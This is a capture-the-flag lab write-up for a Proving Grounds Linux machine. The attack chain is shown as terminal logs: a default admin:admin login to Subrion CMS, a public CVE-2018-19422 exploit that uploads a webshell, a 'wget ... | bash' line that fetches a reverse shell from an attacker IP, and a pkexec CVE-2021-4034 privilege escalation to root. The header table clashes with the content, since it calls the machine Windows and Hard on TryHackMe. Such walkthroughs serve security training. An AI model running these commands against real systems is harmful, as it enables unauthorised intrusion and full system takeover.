---

categories: [ Proving Grounds, Practice ]
tags: [ pkexec, CMS, subrion, Public Exploit, default_creds]
media_subpath: /assets/images/
image:
  width: "1200"
  height: "630"
  alt: Linux Easy Level Machine...
  path: "exfiltration.png"
---


| Machine Link       | https://tryhackme.com/room/set               |
| ------------------ | -------------------------------------------- |
| Operating System   | Windows                                      |
| Difficulty         | Hard                                         |
| Machine Created by | [4ndr34zz](https://tryhackme.com/p/4ndr34zz) |

## Port Scan Results ⤵️

```bash

```
{: .nolineno}
## Web Enumeration ⤵️

![Image](Pasted%20image%2020240611111807.png)

![Image](Pasted%20image%2020240611111836.png)

with default creds file admin : admin I got administrators login 🔻

![Image](Pasted%20image%2020240611111935.png)

### Exploit Usage ⤵️

https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE/tree/main

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Practice/Exfiltrated]
└─$ python3 exploit.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: dbdBd1q5Oa501bIx1p24T44TnS0UdOgA2mzUdOzG
[+] Trying to log in...
wget http://192.168.45.1616^[[2~[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: eutwjgithrbhgym

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/eutwjgithrbhgym.phar 

      

$ wget http://192.168.45.161/rev.sh | bash

$ ls
eutwjgithrbhgym.phar
ewoyjlsedzraleo.phar
rev.sh

$ ./rev.sh

$ sh rev.sh
```
{: .nolineno}


```bash
www-data@exfiltrated:/var/www/html/subrion/admin$ sudo -V
sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
www-data@exfiltrated:/var/www/html/subrion/admin$ /usr/bin/pkexec --version
/usr/bin/pkexec --version
pkexec version 0.105
www-data@exfiltrated:/var/www/html/subrion/admin$ cd /tmp
cd /tmp
www-data@exfiltrated:/tmp$ ls
ls
www-data@exfiltrated:/tmp$ wget http://192.168.45.161/pkexec_CVE-2021-4034.py
wget http://192.168.45.161/pkexec_CVE-2021-4034.py
--2024-06-11 05:43:38--  http://192.168.45.161/pkexec_CVE-2021-4034.py
Connecting to 192.168.45.161:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3067 (3.0K) [text/x-python]
Saving to: ‘pkexec_CVE-2021-4034.py’

pkexec_CVE-2021-403 100%[===================>]   3.00K  --.-KB/s    in 0.03s   

2024-06-11 05:43:38 (102 KB/s) - ‘pkexec_CVE-2021-4034.py’ saved [3067/3067]

www-data@exfiltrated:/tmp$ chmod +x pk	
chmod +x pkexec_CVE-2021-4034.py 
www-data@exfiltrated:/tmp$ python3 pkexec_CVE-2021-4034.py
python3 pkexec_CVE-2021-4034.py
Do you want to choose a custom payload? y/n (n use default payload)  

[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f7c852d6000 at 0x7f7c84b164c0>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# whoami
whoami
root
# cd /root
cd /root
# ls -al
ls -al
total 28
drwx------  4 root root 4096 Jun 11 05:24 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
lrwxrwxrwx  1 root root    9 Jun 10  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Jan  7  2021 .ssh
-rwx------  1 root root   33 Jun 11 05:24 proof.txt
drwxr-xr-x  3 root root 4096 Jan  7  2021 snap
# cat proof	
cat proof	
cat: proof: No such file or directory
# cat proof.txt
cat proof.txt
db0eaa7f647cd07d2a8b9b4f10322a14
# cd /home
cd /home
# ls -al
ls -al
total 12
drwxr-xr-x  3 root   root   4096 Jun 10  2021 .
drwxr-xr-x 20 root   root   4096 Jan  7  2021 ..
drwx--x--x  2 coaran coaran 4096 Jun 10  2021 coaran
# cd coaran
cd coaran
# ls -al
ls -al
total 24
drwx--x--x 2 coaran coaran 4096 Jun 10  2021 .
drwxr-xr-x 3 root   root   4096 Jun 10  2021 ..
lrwxrwxrwx 1 root   root      9 Jun 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 coaran coaran  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 coaran coaran 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 coaran coaran  807 Feb 25  2020 .profile
-rwxr--r-- 1 coaran coaran   33 Jun 11 05:24 local.txt
# cat local.txt
cat local.txt
e5fb28077f505fb52883ba4deb73dc32
# 

```
{: .nolineno}
















> If you have any questions or suggestions, please leave a comment below.
> Thank You ! 
{: .prompt-tip }